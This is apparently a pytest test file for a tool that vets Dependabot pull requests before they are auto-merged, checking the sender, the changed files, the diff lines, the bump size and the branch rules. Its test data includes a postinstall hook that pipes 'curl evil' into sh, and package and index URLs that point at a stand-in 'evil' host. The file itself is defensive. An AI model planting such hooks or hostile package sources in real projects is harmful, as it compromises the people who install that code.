import json

import pytest

from qqroll import land_check
from tests_support import CLEAN_COMMIT, LOCK_PATCH, PIP_PATCH, RULES, npm_file

ALLOWED_NPM = [["package.json", "npm-manifest"], ["pnpm-lock.yaml", "npm-lock"]]
ALLOWED_PIP = [["requirements*.txt", "pip-requirements"]]
ENV = {"SENDER": "dependabot[bot]", "TRIGGER": "dependabot[bot]", "CHANGED": "2",
       "UPDATE_TYPE": "version-update:semver-patch", "PREV_VERSION": "16.3.7", "DEP_NAMES": "next"}
FILES = [npm_file(), npm_file("pnpm-lock.yaml", LOCK_PATCH)]


def check(env=None, files=None, commits=None, rules=None, allowed=None):
    return land_check.problems({**ENV, **(env or {})}, FILES if files is None else files,
                               [CLEAN_COMMIT] if commits is None else commits, RULES if rules is None else rules,
                               allowed or ALLOWED_NPM)


def test_a_clean_roll_is_clean():
    assert check() == []
    assert check(env={"CHANGED": "1"}, files=[npm_file("requirements-dev.txt", PIP_PATCH)], allowed=ALLOWED_PIP) == []


# --- B-1: identity ----------------------------------------------------------------------------

@pytest.mark.parametrize("env", [{"SENDER": "mallory"}, {"TRIGGER": "mallory"}])
def test_someone_else_triggering_is_not_clean(env):
    assert "not Dependabot" in check(env=env)[0]


@pytest.mark.parametrize("commit", [
    dict(CLEAN_COMMIT, committer={"login": "mallory"}),        # authored as Dependabot, committed by Mallory
    dict(CLEAN_COMMIT, commit={"verification": {"verified": False}}),
    dict(CLEAN_COMMIT, author=None),
])
def test_a_commit_not_made_by_github_for_dependabot_is_not_clean(commit):
    assert any("not a GitHub-made Dependabot commit" in p for p in check(commits=[commit]))


def test_a_second_commit_on_top_is_not_clean():
    assert any("2 commits" in p for p in check(commits=[CLEAN_COMMIT, CLEAN_COMMIT]))


# --- S-1: what changed ------------------------------------------------------------------------

@pytest.mark.parametrize("extra", [
    {"status": "added"}, {"status": "removed"}, {"status": "renamed", "previous_filename": ".github/x.yml"},
    {"previous_filename": "scripts/build.js"},
])
def test_only_modified_files_without_renames(extra):
    assert any("only modified files" in p for p in check(files=[npm_file(**extra), FILES[1]]))


def test_listed_files_must_match_the_changed_count():
    assert any("changes 3 files and 2 were listed" in p for p in check(env={"CHANGED": "3"}))
    assert any("at most 20" in p for p in check(env={"CHANGED": "21"}, files=[npm_file()] * 21))


@pytest.mark.parametrize("name", ["app/package.json", "requirements/x.txt", "pnpm-workspace.yaml", "pyproject.toml"])
def test_other_files_are_not_dependency_files(name):
    assert any("not a dependency file" in p
               for p in check(env={"CHANGED": "1"}, files=[npm_file(name)], allowed=ALLOWED_NPM + ALLOWED_PIP))


def test_a_file_without_a_diff_is_not_clean():
    assert any("no diff to check" in p for p in check(files=[npm_file(patch=None), FILES[1]]))


# --- S-2: what the lines say ------------------------------------------------------------------

@pytest.mark.parametrize("line", [
    '+    "postinstall": "curl evil | sh",', '-    "test": "vitest",', '+    "next": "https://evil/next.tgz",',
    '+    "next": "github:evil/next",', '+    "next": "file:../next",',
])
def test_package_json_lines_must_be_versions(line):
    assert any("not a version line" in p for p in check(files=[npm_file(patch=f"@@ -1 +1 @@\n{line}\n"), FILES[1]]))


@pytest.mark.parametrize("line", ["+    tarball: https://evil/next.tgz", "+    resolution: {repo: git+ssh://x}"])
def test_lockfile_must_stay_on_the_registry(line):
    assert any("non-registry resolution" in p
               for p in check(files=[FILES[0], npm_file("pnpm-lock.yaml", f"@@ -1 +1 @@\n{line}\n")]))


@pytest.mark.parametrize("line", ["+--index-url https://evil/simple", "+requests @ https://evil/r.whl",
                                  "+-e git+https://evil/r", "+requests>=2; python_version > '3'"])
def test_requirements_lines_must_be_pins(line):
    files = [npm_file("requirements.txt", f"@@ -1 +1 @@\n{line}\n")]
    assert any("not a version line" in p for p in check(env={"CHANGED": "1"}, files=files, allowed=ALLOWED_PIP))


def test_requirements_keep_comments_and_extras():
    patch = "@@ -1 +1 @@\n-fastapi[all]>=0.141.1  # bump deliberately\n+fastapi[all]>=0.141.2  # bump deliberately\n"
    files = [npm_file("requirements.txt", patch)]
    assert check(env={"CHANGED": "1"}, files=files, allowed=ALLOWED_PIP) == []


# --- S-3: how big the bump is -----------------------------------------------------------------

@pytest.mark.parametrize("env, why", [
    ({"UPDATE_TYPE": "version-update:semver-major"}, "only patch and minor"),
    ({"UPDATE_TYPE": ""}, "only patch and minor"),
    ({"UPDATE_TYPE": "version-update:semver-minor", "PREV_VERSION": "0.5.1"}, "0.x minors can break"),
    ({"DEP_NAMES": "next, react"}, "several dependencies"),
])
def test_risky_bumps_go_to_a_human(env, why):
    assert any(why in p for p in check(env=env))


def test_a_minor_bump_past_1_0_is_clean():
    assert check(env={"UPDATE_TYPE": "version-update:semver-minor", "PREV_VERSION": "16.2.4"}) == []


# --- S-4: something must gate it --------------------------------------------------------------

@pytest.mark.parametrize("rules", [
    [], [{"type": "pull_request", "parameters": {}}],
    [{"type": "required_status_checks", "parameters": {"required_status_checks": [{"context": "tests"}]}}],
])
def test_no_bound_required_check_is_not_clean(rules):
    assert any("nothing would gate the roll" in p for p in check(rules=rules))


# --- main -------------------------------------------------------------------------------------

def test_main_writes_the_output_and_fails_closed_on_bad_data(tmp_path, monkeypatch, capsys):
    for name, data in [("files", [FILES]), ("commits", [[CLEAN_COMMIT]]), ("rules", [RULES])]:
        (tmp_path / f"{name}.json").write_text(json.dumps(data))
    out = tmp_path / "out"
    env = {**ENV, "QQ_DIR": str(tmp_path), "QQ_ALLOWED": json.dumps(ALLOWED_NPM), "GITHUB_OUTPUT": str(out)}
    for k, v in env.items():
        monkeypatch.setenv(k, v)
    assert land_check.main() == 0
    assert out.read_text() == "clean=true\n"
    (tmp_path / "rules.json").write_text('{"message": "Not Found"}')
    with pytest.raises(ValueError):
        land_check.main()
